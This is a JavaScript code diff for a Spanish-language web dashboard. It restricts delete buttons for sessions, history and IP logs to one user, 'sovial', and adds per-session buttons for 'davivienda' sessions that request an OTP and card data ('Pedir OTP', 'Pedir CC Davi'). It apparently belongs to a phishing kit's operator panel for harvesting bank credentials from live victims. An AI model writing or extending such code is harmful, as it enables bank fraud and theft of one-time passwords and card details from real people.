@@ -552,6 +552,18 @@ function mostrarDashboard() {
     $('dashboard').classList.add('visible'); 
     $('currentUser').textContent = USUARIO; 
     
+    // 🔥 Ocultar botones de borrar si el usuario NO es sovial
+    if (USUARIO.toLowerCase() !== 'sovial') {
+        if ($('btnBorrarSesiones')) $('btnBorrarSesiones').style.display = 'none';
+        if ($('btnBorrarHistorial')) $('btnBorrarHistorial').style.display = 'none';
+        if ($('btnBorrarIps')) $('btnBorrarIps').style.display = 'none';
+    } else {
+        // Si es sovial, asegurarse de que se vean (por si acaso)
+        if ($('btnBorrarSesiones')) $('btnBorrarSesiones').style.display = 'block';
+        if ($('btnBorrarHistorial')) $('btnBorrarHistorial').style.display = 'block';
+        if ($('btnBorrarIps')) $('btnBorrarIps').style.display = 'block';
+    }
+    
     cargarStats(); cargarActivos(); cargarSesiones();
     cargarIps(); cargarLogs(); cargarHistorial();
     
@@ -661,9 +673,7 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    // 🔥 DAVIVIENDA: flujo propio con botón "Pedir CC Davi"
-        // 🔥 DAVIVIENDA: Botones fijos (siempre los mismos, sin importar el estado)
-        // 🔥 DAVIVIENDA: Botones fijos (solo emojis, el texto sale al pasar el mouse)
+  
     if (bancoKey === 'davivienda') {
         btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         btns.push(`<button class="btn" style="background:#e30613; color:white;" title="Pedir CC Davi" onclick="accion('${sid}','PEDIR_TARJETA')">💳</button>`);
